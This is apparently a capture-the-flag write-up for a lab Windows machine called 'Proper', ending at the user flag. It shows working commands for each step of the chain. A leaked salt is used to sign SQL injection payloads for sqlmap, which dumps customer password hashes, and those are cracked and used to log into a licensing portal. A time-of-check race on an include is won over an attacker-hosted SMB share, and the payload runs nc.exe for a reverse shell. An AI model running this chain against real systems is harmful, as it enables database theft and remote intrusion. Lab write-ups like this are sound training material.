## Overview

Proper is a Hard Windows machine that exposes only port 80 (Microsoft IIS). The path to a shell is entirely web-driven: a leaked signing salt defeats the SQL-injection "protection" on a product endpoint, dumped customer credentials log into a licensing portal, and a check-then-use file include is raced over an attacker-controlled SMB share to land code execution as `proper\web`. This post stops at the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | Microsoft IIS 10.0 (PHP 7.4.1) | E-commerce site + `/licenses` portal |

```bash
nmap -sC -sV 10.129.10.8
```

Only HTTP is open. The storefront is static, but fuzzing surfaces a `/licenses` login portal, and the product grid loads via an AJAX endpoint, `products-ajax.php`.

## Enumeration

The product endpoint signs its `order` parameter with a hash `h`. Omitting `h` triggers a verbose PHP stack trace that prints the signing salt:

```bash
curl -s "http://10.129.10.8/products-ajax.php?order=id+desc"
```

```
define('SECURE_PARAM_SALT','hie0shah6ooNoim');
```

![salt leak in stack trace](/assets/Images/proper-001_enum_salt-leak.png)

The signature is just `md5(salt + order)`. With the salt known, we can sign any value — so the integrity check provides no protection at all.

```bash
python3 -c "import hashlib;print(hashlib.md5(('hie0shah6ooNoim'+'id desc').encode()).hexdigest())"
```

## Foothold

**SQL injection (signed).** `sqlmap`'s `--eval` recomputes the correct `h` for every payload it generates, automating injection straight through the "protected" parameter:

```bash
sqlmap -u 'http://10.129.10.8/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' \
  --eval="import hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdigest()" \
  --dbms MySQL -D cleaner -T customers --dump --threads 10 --batch
```

That dumps the `cleaner.customers` table — bare MD5 password hashes, all of them weak:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Any cracked pair logs into the licensing portal:

```bash
curl -s -c cj.txt -b cj.txt -X POST http://10.129.10.8/licenses/ \
  --data 'username=<email>&password=<redacted>'
```

**Theme include — TOCTOU race to RCE.** The portal's theme switcher builds a path from the `theme` parameter and loads it, guarded by a check-then-use pattern:

```php
if (strpos(file_get_contents($file), '<?') === false) { include($file); }
```

That is two separate reads of the same file — a time-of-check/time-of-use race. The parameter also accepts UNC paths, so the file can live on our own authenticated SMB server (the IIS app-pool account validates against it):

```bash
sudo impacket-smbserver -smb2support test /home/kali/htb/proper/smb -username web -password '<redacted>'
```

Keep the served file a benign 1 MB blob (passes the `<?` check, and its size slows the read to widen the window) while continuously swapping it for a `<?php ... ?>` payload, and flood requests until the check reads benign and `include()` reads the payload:

```bash
cd /home/kali/htb/proper/smb
while true; do cp pwn.inc .h && mv -f .h header.inc; cp big.inc .h2 && mv -f .h2 header.inc; done &
for i in $(seq 1 300); do curl -s -b cj.txt \
  "http://10.129.10.8/licenses/licenses.php?theme=%5C%5C10.10.16.13%5Ctest&h=<theme_hash>" -o /dev/null & done
```

The payload runs `nc.exe` straight off the UNC share for a reverse shell as `proper\web`.
